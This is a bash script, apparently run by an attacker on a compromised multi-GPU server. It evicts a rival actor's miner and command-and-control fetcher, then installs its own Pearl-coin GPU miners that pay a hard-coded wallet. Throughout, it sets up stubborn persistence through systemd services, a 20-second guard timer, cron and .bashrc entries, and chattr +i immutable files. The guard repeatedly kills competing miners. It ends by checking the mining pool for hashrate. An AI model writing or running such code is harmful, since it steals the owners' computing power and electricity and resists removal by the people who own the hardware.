#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
log "### START17 $(date -u +%FT%TZ)"
log "### ACTOR-ARTEFACTS"
grep -rl -e 'plh-card' -e 'plh-guard' -e 'prl1p6grd' /etc/systemd /etc/cron.d /usr/local/bin /usr/local/lib /opt /root 2>/dev/null | head -30
log "--- 8099"
ss -ltnp 2>/dev/null | grep 8099
ps -eo pid,args | grep -E '8099|c2fetch|t19c2|plh_keepalive|plh-guard' | grep -v grep | head -12
log "### KILL-ACTOR"
for u in plh-card@0 plh-card@1 plh-card@2 plh-card@3 plh-card@4 plh-card@5 plh-card@6 plh-card@7 plh-c2fetch plh-guard.timer plh-guard.service nk-guard.timer nk-guard.service; do systemctl stop "$u" 2>/dev/null; systemctl disable "$u" 2>/dev/null; done
rm -f /etc/systemd/system/plh-guard.timer /etc/systemd/system/plh-guard.service /etc/systemd/system/plh-card@.service /etc/systemd/system/plh-c2fetch.service
systemctl mask 'plh-card@.service' plh-guard.timer plh-guard.service plh-c2fetch.service >/dev/null 2>&1
rm -f /etc/cron.d/plh /etc/cron.d/plh-keepalive /etc/cron.d/plh-keepalive.tmp
P8099=$(ss -ltnp 2>/dev/null | awk '/:8099/{match($0,/pid=([0-9]+)/,m); print m[1]}' | head -1)
[ -n "$P8099" ] && { log "kill 8099 pid=$P8099"; kill -9 $P8099 2>/dev/null; }
pkill -9 -f 'prl1p6grd' 2>/dev/null
pkill -9 -f 'plh-123-184-7-135' 2>/dev/null
pkill -9 -f 'plh_keepalive' 2>/dev/null
pkill -9 -f 'c2fetch' 2>/dev/null
mv /opt/plh /opt/plh.dead.$(date +%s) 2>/dev/null
mv /opt/plh.disabled.* /opt/plh.dead.$(date +%s) 2>/dev/null
mv /root/ul/actor /root/ul/actor.dead.$(date +%s) 2>/dev/null
systemctl daemon-reload
sleep 3
log "ps-after: $(ps -eo args | grep -cE 'prl1p6grd|wildrig-multi.*plh') foreign_procs"
log "### OUR-KIT"
BIN=/opt/arsenal/miners/krig/krig-miner; [ -x "$BIN" ] || BIN=/opt/arsenal/miners/wildrig/wildrig-multi
log "bin=$BIN"
if [ "${BIN##*/}" = "wildrig-multi" ]; then
  cat > /usr/local/bin/ul-g.sh <<'EOG'
#!/bin/bash
exec nice -n 5 /opt/arsenal/miners/wildrig/wildrig-multi --algo pearlhash --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-t2-123-184-7-135-g$1 --pass x --protocol stratum --opencl-devices $1 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 196$1
EOG
else
  cat > /usr/local/bin/ul-g.sh <<'EOG'
#!/bin/bash
exec nice -n 5 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g$1 --password x -d $1 --api-port 126$1
EOG
fi
chmod 755 /usr/local/bin/ul-g.sh
cat > /usr/local/bin/ul-guard.sh <<'EOG'
#!/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
pkill -9 -f 'prl1p6grd' 2>/dev/null
pkill -9 -f 'wildrig-multi.*plh-' 2>/dev/null
for i in 0 1 2 3 4 5 6 7; do systemctl is-active --quiet ul-g$i || systemctl start ul-g$i >>/var/log/ul-guard.log 2>&1; done
EOG
chmod 755 /usr/local/bin/ul-guard.sh
for i in 0 1 2 3 4 5 6 7; do
  printf '[Unit]\nDescription=ul g%s\nAfter=network-online.target\n[Service]\nType=simple\nRestart=always\nRestartSec=15\nNice=5\nCPUWeight=200\nExecStart=/usr/local/bin/ul-g.sh %s\n[Install]\nWantedBy=multi-user.target\n' $i $i > /etc/systemd/system/ul-g$i.service
done
printf '[Unit]\nDescription=ul guard\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/ul-guard.sh\n' > /etc/systemd/system/ul-guard.service
printf '[Unit]\nDescription=ul guard timer\n[Timer]\nOnBootSec=20\nOnUnitActiveSec=20\nAccuracySec=2\nUnit=ul-guard.service\n[Install]\nWantedBy=timers.target\n' > /etc/systemd/system/ul-guard.timer
systemctl daemon-reload
systemctl enable --now ul-guard.timer >/dev/null 2>&1
systemctl enable ul-g0 ul-g1 ul-g2 ul-g3 ul-g4 ul-g5 ul-g6 ul-g7 >/dev/null 2>&1
systemctl start ul-g0 ul-g1 ul-g2 ul-g3 ul-g4 ul-g5 ul-g6 ul-g7 >/dev/null 2>&1
cat > /etc/cron.d/ulguard <<'EOG'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
@reboot root /usr/local/bin/ul-guard.sh
* * * * * root /usr/local/bin/ul-guard.sh
EOG
chmod 644 /etc/cron.d/ulguard
grep -q ul-guard /root/.bashrc 2>/dev/null || echo '/usr/local/bin/ul-guard.sh >/dev/null 2>&1 &' >> /root/.bashrc
chattr +i /usr/local/bin/ul-g.sh /usr/local/bin/ul-guard.sh /etc/cron.d/ulguard /etc/systemd/system/ul-guard.timer /etc/systemd/system/ul-guard.service 2>/dev/null
for i in 0 1 2 3 4 5 6 7; do chattr +i /etc/systemd/system/ul-g$i.service 2>/dev/null; done
log "### STATE"
sleep 30
for i in 0 1 2 3 4 5 6 7; do printf 'g%d=%s ' $i "$(systemctl is-active ul-g$i)"; done; echo
nvidia-smi --query-compute-apps=pid,process_name --format=csv,noheader 2>&1 | head -10
ps -eo args | grep -E 'wildrig|krig' | grep -v grep | awk '{print $2,$3,$4}' | sort | uniq -c | head -12
log "### POOL-90s"
sleep 60
timeout 20 curl -s -m 15 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" | python3 -c "
import json,sys
d=json.load(sys.stdin); rs=d.get('results') or []
for r in rs:
  if '123-184-7-135' in str(r.get('worker','')) and 't2-' in str(r.get('worker','')): print(r.get('worker'),r.get('status'),'valid=',r.get('valid'),'last=',r.get('last_share'),'hs=',int(r.get('avg_hashrate_30m') or 0))
" 2>&1 | head -10
log "### DONE17 $(date -u +%FT%TZ)"
